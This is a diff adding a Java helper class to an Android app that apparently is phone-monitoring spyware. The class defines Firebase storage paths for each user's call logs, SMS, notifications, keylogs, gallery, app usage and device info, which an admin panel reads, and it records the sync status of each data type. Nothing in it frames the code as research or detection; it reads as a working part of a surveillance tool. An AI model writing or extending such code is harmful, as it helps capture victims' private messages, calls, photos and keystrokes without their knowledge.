@@ -1,0 +1,75 @@
+package com.bushorat.app.helpers;
+
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * Central Firebase paths for per-user data readable by the admin panel.
+ *
+ * user_data/{userId}/
+ *   profile/
+ *   device_info/
+ *   call_logs/{id}/
+ *   sms/{id}/
+ *   notifications/{id}/
+ *   keylogs/{id}/
+ *   gallery/{id}/
+ *   app_usage/{id}/
+ *   sync_status/{dataType}/
+ */
+public final class FirebaseDataPaths {
+    public static final String USER_DATA_ROOT = "user_data";
+
+    private FirebaseDataPaths() {
+    }
+
+    public static DatabaseReference userData(String userId) {
+        return FirebaseDatabase.getInstance().getReference(USER_DATA_ROOT).child(userId);
+    }
+
+    public static DatabaseReference profile(String userId) {
+        return userData(userId).child("profile");
+    }
+
+    public static DatabaseReference deviceInfo(String userId) {
+        return userData(userId).child("device_info");
+    }
+
+    public static DatabaseReference callLogs(String userId) {
+        return userData(userId).child("call_logs");
+    }
+
+    public static DatabaseReference sms(String userId) {
+        return userData(userId).child("sms");
+    }
+
+    public static DatabaseReference notifications(String userId) {
+        return userData(userId).child("notifications");
+    }
+
+    public static DatabaseReference keylogs(String userId) {
+        return userData(userId).child("keylogs");
+    }
+
+    public static DatabaseReference gallery(String userId) {
+        return userData(userId).child("gallery");
+    }
+
+    public static DatabaseReference appUsage(String userId) {
+        return userData(userId).child("app_usage");
+    }
+
+    public static DatabaseReference syncStatus(String userId) {
+        return userData(userId).child("sync_status");
+    }
+
+    public static void updateSyncStatus(String userId, String dataType, int count) {
+        Map<String, Object> status = new HashMap<>();
+        status.put("lastSync", System.currentTimeMillis());
+        status.put("count", count);
+        syncStatus(userId).child(dataType).updateChildren(status);
+    }
+}
